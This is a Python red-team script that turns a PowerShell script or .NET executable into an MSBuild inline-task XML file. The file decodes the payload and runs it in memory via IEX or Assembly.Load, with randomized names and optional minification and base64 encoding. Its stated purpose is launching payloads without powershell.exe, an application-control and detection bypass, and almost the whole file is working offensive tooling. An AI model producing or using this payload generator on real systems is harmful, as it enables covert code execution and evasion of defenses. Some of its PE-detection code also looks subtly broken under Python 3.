#!/usr/bin/python3
#
# Red-Teaming script that will leverage MSBuild technique to convert Powershell input payload or
# .NET/CLR assembly EXE file into inline-task XML file that can be further launched by:
#   %WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
#
# Requirements:
#   - pefile
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import re
import io
import sys
import gzip
import base64
import string
import struct
import random
import argparse

try:
    import pefile
except ImportError:
    print('Missing requirement: "pefile". Install it using: pip install pefile')
    sys.exit(-1)


def getCompressedPayload(filePath):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj = out, mode = 'w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode()
    )
    return powershell

def getInlineTask(payload, exeFile):
    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    taskName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))

    powershellLaunchCode = string.Template('''<Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class $templateName : Task {
                public override bool Execute() {

                    byte[] payload = System.Convert.FromBase64String("$payload2");
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }                                
            }           
        ]]>
      </Code>''').safe_substitute(
        templateName = templateName,
        payload2 = base64.b64encode(payload)
    )

    exeLaunchCode = string.Template('''<ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Reflection" />
      
      <Code Type="Fragment" Language="cs">
        <![CDATA[
                    string payload = "$payload2";
                    byte[] decoded = System.Convert.FromBase64String(payload);

                    Assembly asm = Assembly.Load(decoded);
                    MethodInfo method = asm.EntryPoint;
                    object instance = asm.CreateInstance(method.Name);
                    method.Invoke(instance, null); 
        ]]>
      </Code>''').safe_substitute(
        payload2 = base64.b64encode(payload)
    )

    launchCode = exeLaunchCode if exeFile else powershellLaunchCode

    template = string.Template('''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                              -->
  <!--  Automatically generated using `generateMSBuildPowershellXML.py` utility  -->
  <!--  by Mariusz B. / mgeeky <mb@binary-offensive.com>                         -->

  <Target Name="$taskName">
    <$templateName />
  </Target>
  <UsingTask TaskName="$templateName" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    $launchCode
    </Task>
  </UsingTask>
</Project>''').safe_substitute(
        taskName = taskName,
        templateName = templateName,
        launchCode = launchCode
    )

    return template

def detectFileIsExe(filePath, forced = False):
    first1000 = []

    with open(filePath, 'rb') as f:
        first1000 = f.read()[:1000]

    if not (first1000[0] == 'M' and first1000[1] == 'Z'):
        return False

    elfanew = struct.unpack('<H', first1000[0x3c:0x3c + 2])[0]

    if not (first1000[elfanew + 0] == 'P' and first1000[elfanew + 1] == 'E'):
        return False

    dosStub = "This program cannot be run in DOS mode."
    printables = ''.join([x for x in first1000[0x40:] if x in string.printable])

    #if not dosStub in printables:
    #    return False

    try:
        pe = pefile.PE(filePath)
        cli = pe.OPTIONAL_HEADER.DATA_DIRECTORY[14]

        if not (cli.VirtualAddress != 0 and cli.Size != 0):
            sys.stderr.write('[!] Specified input file is not a .NET Assembly / CLR executable file!\n')
            if forced:
                sys.exit(-1)
            raise Exception()
        else:
            sys.stderr.write('[+] Specified EXE file seems to be .NET Assembly / CLR compatible.\n')

        return True
    except:
        pass

    return False

def minimize(output):
    output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
    output = output.replace('\n', '')
    output = re.sub(r'\s{2,}', ' ', output)
    output = re.sub(r'\s+([^\w])\s+', r'\1', output)
    output = re.sub(r'([^\w"])\s+', r'\1', output)

    variables = {
        'payload' : 'x',
        'method' : 'm',
        'asm' : 'a',
        'instance' : 'o',
        'pipeline' : 'p',
        'runspace' : 'r',
        'decoded' : 'd'
    }

    for k, v in variables.items():
        output = output.replace(k, v)

    return output

def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile>')
    parser.add_argument('inputFile', help = 'Input file to be encoded within XML. May be either Powershell script or PE/EXE file.')
    parser.add_argument('-m', '--minimize', action='store_true', help = 'Minimize the output XML file.')
    parser.add_argument('-b', '--encode', action='store_true', help = 'Base64 encode output XML file.')
    parser.add_argument('-e', '--exe', action='store_true', help = 'Specified input file is an Mono/.Net assembly PE/EXE (optional, if not used - the script will try to sense that). WARNING: Launching EXE is possibly ONLY WITH MONO/.NET IL/Assembly EXE file, not an ordinary native PE/EXE!')

    args = parser.parse_args()

    return args

def main(argv):
    sys.stderr.write('''
        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

''')
    if len(argv) < 2:
        print('Usage: ./generateMSBuildPowershellXML.py <inputFile>')
        sys.exit(-1)

    args = opts(argv)

    isItExeFile = args.exe or detectFileIsExe(args.inputFile, args.exe)

    if isItExeFile:
        sys.stderr.write('[?] File recognized as PE/EXE.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()
    else:
        sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')

        if args.inputFile.endswith('.exe'):
            return False
            
        payload = getCompressedPayload(args.inputFile)

    output = getInlineTask(payload, isItExeFile)

    if args.minimize:
        output = minimize(output)

    if args.encode:
        print(base64.b64encode(output))
    else:
        print(output)

if __name__ == '__main__':
    main(sys.argv)
